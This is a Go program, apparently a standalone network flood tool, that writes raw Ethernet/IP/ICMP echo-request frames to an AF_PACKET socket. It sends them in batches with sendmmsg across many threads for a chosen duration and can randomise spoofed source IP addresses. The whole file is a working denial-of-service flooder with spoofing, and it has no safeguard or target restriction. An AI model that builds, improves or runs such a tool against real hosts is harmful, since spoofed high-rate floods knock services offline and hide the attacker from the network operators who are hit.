// NPicmpT.go
package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"
)

const (
	ethPAll = 0x0003
	ethLen  = 14
	ipLen   = 20
	icmpLen = 8
	ipOff   = ethLen
	icmpOff = ethLen + ipLen

	ipSrcOff   = ipOff + 12
	ipDstOff   = ipOff + 16
	ipChkOff   = ipOff + 10
	icmpIDOff  = icmpOff + 4
	icmpSeqOff = icmpOff + 6
	icmpChkOff = icmpOff + 2

	BATCH = 32
)

const SYS_SENDMMSG = 307

type mmsghdr struct {
	Hdr syscall.Msghdr
	Len uint32
	_   [4]byte
}

func sendmmsg(fd int, msgs []mmsghdr) (int, syscall.Errno) {
	r, _, errno := syscall.Syscall6(SYS_SENDMMSG,
		uintptr(fd), uintptr(unsafe.Pointer(&msgs[0])), uintptr(len(msgs)), 0, 0, 0)
	return int(r), errno
}

func htons(v uint16) uint16 { return (v << 8) | (v >> 8) }

func foldSum(s uint32) uint16 {
	for s>>16 != 0 {
		s = (s & 0xFFFF) + (s >> 16)
	}
	return ^uint16(s)
}

func rawSum(data []byte) uint32 {
	var sum uint32
	n := len(data) &^ 1
	for i := 0; i < n; i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)&1 != 0 {
		sum += uint32(data[len(data)-1]) << 8
	}
	return sum
}

func parseMAC(s string) ([6]byte, bool) {
	var mac [6]byte
	parts := strings.Split(s, ":")
	if len(parts) != 6 {
		return mac, false
	}
	for i, p := range parts {
		v, err := strconv.ParseUint(p, 16, 8)
		if err != nil {
			return mac, false
		}
		mac[i] = byte(v)
	}
	return mac, true
}

func parseIPv4(s string) uint32 {
	ip := net.ParseIP(s).To4()
	if ip == nil {
		return 0
	}
	return binary.BigEndian.Uint32(ip)
}

func findIfaceByIP(ip uint32) (int, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return 0, err
	}
	for _, ifc := range ifaces {
		addrs, _ := ifc.Addrs()
		for _, a := range addrs {
			if ipnet, ok := a.(*net.IPNet); ok {
				ip4 := ipnet.IP.To4()
				if ip4 != nil && binary.BigEndian.Uint32(ip4) == ip {
					return ifc.Index, nil
				}
			}
		}
	}
	return 0, fmt.Errorf("interface not found")
}

func lcg(s *uint32) uint32 { *s = *s*1664525 + 1013904223; return *s }

func setupFd(ifIndex int, dmac [6]byte) (int, error) {
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(ethPAll)))
	if err != nil {
		return 0, err
	}
	_ = syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, 4*1024*1024)
	_ = syscall.SetsockoptInt(fd, syscall.SOL_PACKET, 20, 1)
	var sllAddr [8]byte
	copy(sllAddr[:], dmac[:])
	sa := &syscall.SockaddrLinklayer{Protocol: htons(ethPAll), Ifindex: ifIndex, Halen: 6, Addr: sllAddr}
	if err := syscall.Bind(fd, sa); err != nil {
		syscall.Close(fd)
		return 0, err
	}
	return fd, nil
}

type workerCtx struct {
	fd          int
	counter     *uint64
	stop        *int32
	randomIP    bool
	baseIP      uint32
	seed        uint32
	idStart     uint16
	dstIP       uint32
	pktSize     int
	bufs        [][]byte
	msgs        []mmsghdr
	iovecs      []syscall.Iovec
	ipBaseSum   uint32
	icmpBaseSum uint32
}

func newWorker(fd int, counter *uint64, stop *int32, rip bool, baseIP, dstIP uint32,
	smac, dmac [6]byte, pktSize int, seed uint32, idStart uint16) *workerCtx {
	if pktSize < ethLen+ipLen+icmpLen {
		pktSize = ethLen + ipLen + icmpLen
	}
	w := &workerCtx{
		fd: fd, counter: counter, stop: stop,
		randomIP: rip, baseIP: baseIP, seed: seed, idStart: idStart,
		dstIP: dstIP, pktSize: pktSize,
	}
	big := make([]byte, pktSize*BATCH)
	w.bufs = make([][]byte, BATCH)
	w.msgs = make([]mmsghdr, BATCH)
	w.iovecs = make([]syscall.Iovec, BATCH)
	icmpPayload := uint16(pktSize - icmpOff)
	for i := 0; i < BATCH; i++ {
		buf := big[i*pktSize : (i+1)*pktSize]
		w.bufs[i] = buf
		copy(buf[0:6], dmac[:])
		copy(buf[6:12], smac[:])
		binary.BigEndian.PutUint16(buf[12:14], 0x0800)
		buf[ipOff] = 0x45
		binary.BigEndian.PutUint16(buf[ipOff+2:ipOff+4], uint16(ipLen)+icmpPayload)
		buf[ipOff+8] = 64
		buf[ipOff+9] = 1
		binary.BigEndian.PutUint32(buf[ipDstOff:ipDstOff+4], dstIP)
		buf[icmpOff] = 8 // Echo request
		w.iovecs[i] = syscall.Iovec{Base: &buf[0], Len: uint64(pktSize)}
		w.msgs[i].Hdr.Iov = &w.iovecs[i]
		w.msgs[i].Hdr.Iovlen = 1
	}
	w.ipBaseSum = rawSum(w.bufs[0][ipOff : ipOff+ipLen])
	w.icmpBaseSum = rawSum(w.bufs[0][icmpOff:])
	return w
}

func (w *workerCtx) run() {
	c := w.idStart
	for atomic.LoadInt32(w.stop) == 0 {
		for i := 0; i < BATCH; i++ {
			buf := w.bufs[i]
			var srcIP uint32
			if w.randomIP {
				srcIP = lcg(&w.seed) & 0xFEFFFFFF
			} else {
				srcIP = w.baseIP
			}
			c++
			if c == 0 {
				c = 1
			}
			binary.BigEndian.PutUint32(buf[ipSrcOff:ipSrcOff+4], srcIP)
			binary.BigEndian.PutUint16(buf[icmpIDOff:icmpIDOff+2], c)
			binary.BigEndian.PutUint16(buf[icmpSeqOff:icmpSeqOff+2], c)
			ipSum := w.ipBaseSum + uint32(srcIP>>16) + uint32(srcIP&0xFFFF)
			binary.BigEndian.PutUint16(buf[ipChkOff:ipChkOff+2], foldSum(ipSum))
			icmpSum := w.icmpBaseSum + uint32(c) + uint32(c)
			binary.BigEndian.PutUint16(buf[icmpChkOff:icmpChkOff+2], foldSum(icmpSum))
		}
		n, errno := sendmmsg(w.fd, w.msgs)
		if errno == 0 {
			atomic.AddUint64(w.counter, uint64(n))
		}
		runtime.KeepAlive(w)
	}
}

func main() {
	if len(os.Args) < 6 {
		fmt.Fprintf(os.Stderr, "Usage: %s <src_ip> <dst_ip> <port_ignored> <threads> <duration> [dst_mac] [--random-ip] [--packet-size <bytes>]\n", os.Args[0])
		os.Exit(1)
	}
	srcIP := parseIPv4(os.Args[1])
	dstIP := parseIPv4(os.Args[2])
	threads, _ := strconv.Atoi(os.Args[4])
	duration, _ := strconv.Atoi(os.Args[5])
	if threads <= 0 {
		threads = 4
	}
	if threads > 256 {
		threads = 256
	}
	dmac := [6]byte{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
	rip := false
	pktSize := 0
	for i := 6; i < len(os.Args); i++ {
		switch os.Args[i] {
		case "--random-ip":
			rip = true
		case "--random-mac": // ignore
		case "--packet-size":
			if i+1 < len(os.Args) {
				pktSize, _ = strconv.Atoi(os.Args[i+1])
				i++
			}
		default:
			if m, ok := parseMAC(os.Args[i]); ok {
				dmac = m
			}
		}
	}
	var stop int32
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() { <-sigCh; atomic.StoreInt32(&stop, 1) }()
	ifIndex, err := findIfaceByIP(srcIP)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	ifc, err := net.InterfaceByIndex(ifIndex)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	var smac [6]byte
	copy(smac[:], ifc.HardwareAddr)
	var fds []int
	for i := 0; i < threads; i++ {
		fd, err := setupFd(ifIndex, dmac)
		if err != nil {
			for _, f := range fds {
				_ = syscall.Close(f)
			}
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		fds = append(fds, fd)
	}
	var total uint64
	var wg sync.WaitGroup
	t0 := time.Now()
	base := uint32(t0.Unix())
	for i := 0; i < threads; i++ {
		w := newWorker(fds[i], &total, &stop, rip, srcIP, dstIP, smac, dmac,
			pktSize, base+uint32(i)*123456789, uint16(i*1000+1))
		wg.Add(1)
		go func(w *workerCtx) { defer wg.Done(); w.run() }(w)
	}
	if duration > 0 {
		time.Sleep(time.Duration(duration) * time.Second)
	} else {
		fmt.Println("Press Enter to stop...")
		fmt.Scanln()
	}
	atomic.StoreInt32(&stop, 1)
	wg.Wait()
	for _, f := range fds {
		_ = syscall.Close(f)
	}
	ms := time.Since(t0).Milliseconds()
	pk := atomic.LoadUint64(&total)
	pps := 0.0
	if ms > 0 {
		pps = float64(pk) * 1000.0 / float64(ms)
	}
	mbps := pps * float64(pktSize) * 8 / 1e6
	fmt.Printf("Packets: %d\nPPS: %.0f\nMbps: %.2f\n", pk, pps, mbps)
}
